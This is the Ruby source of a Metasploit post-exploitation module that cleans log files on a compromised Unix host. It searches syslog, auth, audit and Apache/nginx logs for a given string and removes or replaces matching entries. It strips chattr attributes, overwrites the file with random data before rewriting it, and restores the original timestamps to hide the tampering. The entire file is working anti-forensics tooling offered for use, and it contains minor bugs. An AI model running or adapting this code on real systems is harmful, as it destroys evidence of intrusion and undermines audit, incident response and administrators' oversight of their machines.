require 'msf/core'
require 'msf/core/post/file'
require 'core/post/staekka'
require 'core/post/staekka/file'
require 'core/post/staekka/unix'
require 'core/post/unix/commands'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Staekka
  include Msf::Post::Staekka::Unix
  include Msf::Post::Unix::Commands
  include Msf::Post::Updatedb

  def initialize(info = {})
    super(update_info(info,
        'Name'          => 'Syslog Logfiles Cleaner',
        'Description'   => %q(Clear syslog like log files),
        'Author'        => [ 'jot'],
        'SessionTypes'  => [ 'shell' ]
      ))
    register_options(
      [
        OptBool.new('USE_UPDATEDB',  [ false, 'Use an updatedb database and search for filenames instead of full path', true]),
        OptString.new('STRING',  [ true, 'A string to be removed from the log files']),
        OptString.new('REPLACE',  [ false, 'A string for replacing the original string (if empty logentries will be removed)']),
        OptPath.new('FILES',  [ false, 'A special log file']),
        OptString.new('LOGFORMAT', [false, 'Specify a special logformat. Can be "syslog" for typical syslog files, "by_line" for line based logfiles']),
        OptBool.new('LOCALEDIT',  [ false, 'Edit text dump in local editor', false]),
      ], self.class)
  end

  def run
    string = datastore['STRING'].strip
    if string.empty?
      print_error('String empty')
      raise ArgumentError
    end

    localedit = datastore['LOCALEDIT']

    if datastore['LOGFORMAT']
      logformat = datastore['LOGFORMAT']
      unless (logformat == 'syslog') or (logformat == 'by_line')
        print_error('Invalid logformat')
        raise ArgumentError
      end
    end

    replace = datastore['REPLACE']

    all_log_files.each do |file|
      logformat = nil
      tmpfile = nil
      attr = nil
      ################
      # check file permissions
      next unless  permissions?(file)
      ################
      # size check/warning
      size = filesize(file)
      if size.nil? || size == 0
        vprint_warning "#{file}: not readable or empty"
        next
      elsif size > 1024 * 1024 * 1024 # 1G
        print_error "#{file}: file size (#{size}) more than 1 G: This would fail and crash the session! Cannot download"
        print_error "#{file} will be igroned due to this size"
        next
      elsif size > 1024 * 1024 * 100  # 100 MB
        print_warning "#{file}: file size (#{size}) more than 100Mb: This will need long time and lot of recourses"
        print_error "#{file} will be igroned due to this size"
        next
      elsif size > 1024 * 1024 * 10           # 10 MB
        # 10 MB
        print_warning "#{file}: file size (#{size}) more than 10Mb: This will need a while"
      elsif size > 1024 * 1024      # 1MB
        print_warning "#{file}: file size (#{size}) more than 1Mb: This might need some time"
      else                          # less
        # OK
      end

      ################
      # timestamp
      tmpfile = touch_tmpfile(file)
      ###############
      # logfile?
      unless logformat
        if syslog_format?(file)
          logformat = 'syslog'
        end
      end

      if logformat.nil?
        vprint_info("#{file} unknown logformat.")
        touch(file, tmpfile)
        rm_f(tmpfile)
        next
      end
      ################
      # unzip? TODO
      # file system attributes:
      # => linux
      attr = ext_attributes(file)
      if attr
        # remove attributes
        cmd_exec "chattr -#{attr} #{file}"
      end
      ##################
      # read file
      data = read_logfile(file)
      ##################
      # clear file

      if localedit
        editor = Rex::Compat.getenv('EDITOR') || 'vi'
        edit_file = Tempfile.new('logfile')
        edit_file.print data
        edit_file.close
        system("#{editor} #{edit_file.path}")
        clean  = ::File.read edit_file.path
      elsif replace.to_s.empty?
        clean = remove_string(data, string, logformat)
        if data.length == clean.length
          print_info("#{file} was already clean")
          touch(file, tmpfile)
          rm_f(tmpfile)
          next
        end
      else
        clean = replace_string(data, string, replace)
      end

      ##################
      # overwrite file
      random_data = ::Rex::Text.rand_text_alpha(data.length)
      random_data <<  "\x00" * 256
      write_file(file, random_data)
      ##################
      # write file
      write_file(file, clean)
      #file.close
      ##################
      # file system attributes:
      if attr
        # add attributes again
        cmd_exec "chattr +#{attr} #{file}"
      end
      ##################
      # zip?
      ##################
      # timestamp
      touch(file, tmpfile)
      rm_f(tmpfile)
    end
  end

  def all_log_files
    out = []
    if datastore['FILES']
      files = datastore['FILES'].split(" ")
    else
      files = log_files_syslog + log_files_web
    end

    files.flatten!
    files.compact!
    files.uniq!

    files.each do |file|
      file.strip!
      next if file.empty?
      if (file.start_with? '/') or  (file.start_with? './') or (file.start_with? '..')
        if exists?(file)
          out << file
        end
      else
        # search updatedb
        out.concat find_files(file)
      end
    end
    out
  end

  def log_files_syslog
    [
      '/var/log/messages',
      '/var/log/auth.log',
      '/var/log/auth',
      '/var/log/debug',
      '/var/log/ssh.log',
      '/var/log/ssh',
      '/var/log/debug.log',
      '/var/log/audit',
      '/var/log/audit.log',
      '/var/log/kernel',
      '/var/log/kernel.log',
    ]
  end

  def log_files_web
    [
      '/var/log/apache2/access',
      '/var/log/apache2/access.log',
      '/var/log/apache2/error',
      '/var/log/apache2/error.log',
      '/var/log/apache2/ssl_access',
      '/var/log/apache2/ssl_access.log',
      '/var/log/apache2/ssl_error',
      '/var/log/apache2/ssl_error.log',
      '/var/log/apache/access',
      '/var/log/apache/access.log',
      '/var/log/apache/error',
      '/var/log/apache/error.log',
      '/var/log/apache/ssl_access',
      '/var/log/apache/ssl_access.log',
      '/var/log/apache/ssl_error',
      '/var/log/apache/ssl_error.log',
      '/var/log/httpd/access',
      '/var/log/httpd/access.log',
      '/var/log/httpd/error',
      '/var/log/httpd/error.log',
      '/var/log/httpd/ssl_access',
      '/var/log/httpd/ssl_access.log',
      '/var/log/httpd/ssl_error',
      '/var/log/httpd/ssl_error.log',
      '/var/log/web/access',
      '/var/log/web/access.log',
      '/var/log/web/error',
      '/var/log/web/error.log',
      '/var/log/web/ssl_access',
      '/var/log/web/ssl_access.log',
      '/var/log/web/ssl_error',
      '/var/log/web/ssl_error.log',
      '/var/log/lighttpd/access.log',
      '/var/log/lighttpd/error.log',
      '/var/log/thttpd.log',
      '/var/log/nginx/access.log',
      '/var/log/nginx/error.log',
    ]
  end

  def permissions?(file)
    if (readable?(file)) and (writeable?(file))
      true
    else
      print_error "Need read and write permissions for #{file} for changing it! Cannot go on"
      false
    end
  end

  def ext_attributes(file)
    attributes = nil
    out = cmd_exec("lsattr #{file} 2>/dev/null")
    out  = out.to_s.strip
    return nil if out.empty?
    attributes = out.split(" ")[0].to_s.delete('-')
    unless attributes.match(/^[aAcCdDeEhiIjNsStTuXZ]$/)
      return nil
    end
    attributes
  end

  def read_logfile(file)
    data = nil
    data = read_file(file, false, false) # TODO: read_file(file, false, false) if .gz
    data
  end

  def syslog_format?(data)
    logformats = [
      #	'%b %e %l:%M:%S',
      '%b %e %H:%M:%S',
      '%b %d %H:%M:%S',
      '%b %-d %H:%M:%S',
      '%b %e %T',
      '%b %d %H:%M:%S',
      '%b %d %Y %H:%M:%S',
      '%Y-%m-%d %H:%M:%S',
      "%d-%m-%Y \t %H:%M:%S",
      "%Y-%m-%d \t %H:%M:%S",
      '%d-%m-%Y - %H:%M:%S',
      '%a,  %d  %b %Y %H:%M:%S %z',
      '%FT%T',
      '%Y-%m-%d %X',
      '%Y-%m-%d %H:%M:%S',
      '%Y-%m-%dT%H:%M:%S',
      '%b %e %Y %H:%M:%S ',
      '%a, %Y-%m-%d %H:%M:%S',
      ###########
      # also web server logs
      '%d/%b/%Y:%T',
      '%a %b %-d %H:%M:%S %Y',
    ]
    number_of_lines = 10
    #first_lines = IO.readlines(file)[0..number_of_lines]
    #last_lines = IO.readlines(file)[(number_of_lines * -1)..-1]
    first_lines = data.split("\n")[0..number_of_lines]
    last_lines = data.split("\n")[(number_of_lines * -1)..-1]
    data = first_lines.to_a.join + last_lines.to_a.join
    data.each_line do |line|
      valid = false
      begin
        timestamp = Time.parse(line)
      rescue
        timestamp = nil
      end
      if timestamp.nil?
        break
      end
      logformats.each do |l|
        t =  timestamp.strftime(l)
        if line.start_with? t
          valid = true
          break
        elsif line.match(/^\[#{t}\]/)
          valid = true
          break
        elsif line.match(/^rnrsoft\s*#{t}/)
          valid = true
          break
        elsif line.match(/^<Message><DateTime>#{t}/)
          valid = true
          break
        end
      end
      if valid == false
        vprint_error "No syslog log format:\n#{line.dump}"
        return false
      end

    end
    true
  end

  def replace_string(data, string, replace)
    data.gsub(/#{string}/, replace)
  end

  def remove_string(data, string, logformat)
    case logformat
    when 'syslog'
      remove_string_syslog(data, string)
    when 'by_line'
      remove_string_by_line(data, string)
    else
      raise 'Invalid logformat'
    end
  end

  def remove_string_by_line(data, string)
    rx = Regexp.new(string)
    out = ''
    data.each_line do |line|
      if rx.match(line)
      else
        out << line
      end
    end
    out
  end

  def remove_string_syslog(data, string)
    rx = Regexp.new(string)
    out = ''
    log_entry = ''
    timestamp = nil
    data.each_line do |line|
      revious_timestamp = timestamp
      begin
        timestamp = Time.parse(line)
      rescue
        timestamp = nil
      end
      if revious_timestamp == timestamp
        log_entry <<  line
      else
        if rx.match(log_entry)
        else
          out << log_entry
        end
        log_entry = line
      end
    end
    out
  end

  def touch_tmpfile(file)
    tmpfile = '/tmp/' + ::Rex::Text.rand_text_alpha(16)
    touch(tmpfile, file)
    tmpfile
  end

end
